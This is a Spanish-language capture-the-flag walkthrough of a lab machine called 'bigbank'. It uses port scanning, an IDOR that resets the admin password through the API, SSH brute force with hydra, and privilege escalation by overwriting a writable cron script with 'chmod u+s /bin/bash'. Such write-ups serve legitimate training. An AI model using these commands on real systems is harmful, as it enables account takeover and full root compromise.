## FASE DE RECONOCIMIENTO
desplegamos la máquina y sabiendo que su IP es `172.17.0.2 ` vamos a realizar un escaneo de puertos para ver cuales tiene abiertos, los servicios que corren
por ello y las versiones por si son vulnerables:

```bash
sudo nmap -sS -sVC -p- --open -Pn --min-rate 5000 -vvv 172.17.0.2 -oN PuertosYServicios
```
![CTF](images/bigbank/1.png)


![CTF](images/bigbank/2.png)



Vemos:

-Puerto 22, SSH con version no vulnerable a enumeracion de usuarios


-Puerto 80, HTTP


Nos vamos a centrar en el puerto 80:

```bash
whatweb http://172.17.0.2 | tee whatweb

curl -I 172.17.0.2 
```

![CTF](images/bigbank/3.png)


No vvemos nada rao así pues abrimos la página en el navegador:




![CTF](images/bigbank/4.png)



Vemos que pone autenticacion JWT, y mirando el código fuente vemos una ruta interesante:

```
/api/v1/_docs-3fcb199bbb">Documentación de la API 
```


![CTF](images/bigbank/5.png)


Nos vamos a la página con la documentación `http://172.17.0.2/api/v1/_docs-3fcb199bbb` y vemos todo un despliegue de oportunidades:

![CTF](images/bigbank/6.png)


Desplegando vemos lo siguiente:

![CTF](images/bigbank/7.png)

Un IDOR (Insecure Direct Object Reference) aparece cuando una aplicación permite acceder o modificar un recurso usando su identificador sin comprobar
adecuadamente si el usuario tiene permiso para hacerlo.


Nuestra prioridad ahora es crear una cuenta, listar usuarios, cambiar la cuenta del administrador y ver si podemos acceder a backup y descargarlo.


![CTF](images/bigbank/8.png)

Desde aqui sin curl ni nada podemos crear un usuario con `try it out`

![CTF](images/bigbank/99.png)


![CTF](images/bigbank/1010.png)


una vez registrados necesitamos saber el token:

```bash
curl -s -X POST 'http://172.17.0.2/api/auth/login' \
  -H 'accept: */*' \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "pepeloco",
    "password": "pepeloco"
  }' | jq .
```

![CTF](images/bigbank/11.png)



Ya tenemos el token, en mi caso:
```
"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI3IiwidXNlcm5hbWUiOiJwZXBlbG9jbyIsImV4cCI6MTc5MjA5ODE5NX0.IRL0BaxKsb94MS5PQATQwT0xiwcCqvrMvMLA2w-beP0",
"token_type": "bearer",
```

guardo el token en una variable para trabajar mejor con ella:

```bash
TOKEN=$(curl -s -X POST 'http://172.17.0.2/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pepeloco","password":"pepeloco"}' \
  | jq -r '.access_token')
```


![CTF](images/bigbank/12.png)

comprobamos que el token funciona:

```bsah
curl -s 'http://172.17.0.2/api/auth/me' \
  -H "Authorization: Bearer $TOKEN" | jq .
```


![CTF](images/bigbank/13.png)


Vale, funciona, lio, listamos usuarios:

```bash
curl -s 'http://172.17.0.2/api/users' \
  -H "Authorization: Bearer $TOKEN" | jq .
```

![CTF](images/bigbank/14.png)

Ahi vemos que el usuario administrador es el `id=5`


![CTF](images/bigbank/15.png)

## DOS FORMAS DE ACCEDER 

## 1º ssh CON FUERZABRUTA:

Aquí hay dos formas de acceder podemos hacer un diccionario con nombres y apellidos:

```bash
curl -s 'http://172.17.0.2/api/users' \
  -H "Authorization: Bearer $TOKEN" |
jq -r '.[] | (.full_name | ascii_downcase | gsub(" "; "")), (.full_name | ascii_downcase | split(" ")[])' \
  > diccionario.txt
```


![CTF](images/bigbank/16.png)


y hago una atque por fuerzabruta:
```bash
hydra -L diccionario.txt -P diccionario.txt ssh://172.17.0.2 -VI -f
```


![CTF](images/bigbank/17.png)


![CTF](images/bigbank/18.png)



## 2º DESCARGARNDO EL BACKUP


1-Cambiamos el password a admin:

```bash
curl -i -X POST 'http://172.17.0.2/api/users/5/change-password' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"new_password":"AdminCTF2026!"}'
```


2-sacamos el token:

```bash
curl -s -X POST 'http://172.17.0.2/api/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"AdminCTF2026!"}' | jq .
```


![CTF](images/bigbank/19.png)

guardo el token en una variable para trabajar con ella:
```bash
TOKEN_ADMIN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1IiwidXNlcm5hbWUiOiJhZG1pbiIsImV4cCI6MTc5MjA5OTQ1NH0.csKEpAJZwT6l3K0WPqVCsdeuQDS-RRhiOw4Meaj1Ss8'
```

y descargo el backup:

```bash
curl -s -X GET 'http://172.17.0.2/api/admin/backup' \
  -H "Authorization: Bearer $TOKEN_ADMIN" \
  -o ctf_bank_backup.zip
```
![CTF](images/bigbank/20.png)



Descomprimimos y vemos un archivo con algo interesante:

![CTF](images/bigbank/21.png)


el user y password:

```
charlie chocolate
```

## ESCALADA DE PRIVILEGIOS

Nos conectamos por SSH:
```bash
ssh charlie@172.17.0.2
```
cuando nos pida la contraseña `chocolate`

![CTF](images/bigbank/22.png)

miramos grupos, binarios...y nada así pues nos vamos mirar los procesos que se estan ejecutando.

nos descargamos pspy de:
```bash
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
```
y lo pasamos a la maquina de esta manera, nos situamos donde tengamos el pspy64 descargado:

```bash
scp pspy64 charlie@172.17.0.2:/tmp/
```


![CTF](images/bigbank/23.png)


damos permisos de ejecucion:

```bash
chmod +x pspy64
```


![CTF](images/bigbank/24.png)


y lo ejecutamos:


```bash
./pspy64
```


![CTF](images/bigbank/26.png)



y vemos esto

```
/bin/bash /backup.sh
```
![CTF](images/bigbank/27.png)


comprobamos los permisos que tiene:

```bash
ls -la /backup.sh
```
![CTF](images/bigbank/permisos.png)

podemos modificar el archivo:

```bash
echo "chmod u+s /bin/bash" > /backup.sh
```

y esperamos a que tenga permisos y ejecutamos:

```bash
bash -p
```

y ya somos root

![CTF](images/bigbank/28.png)
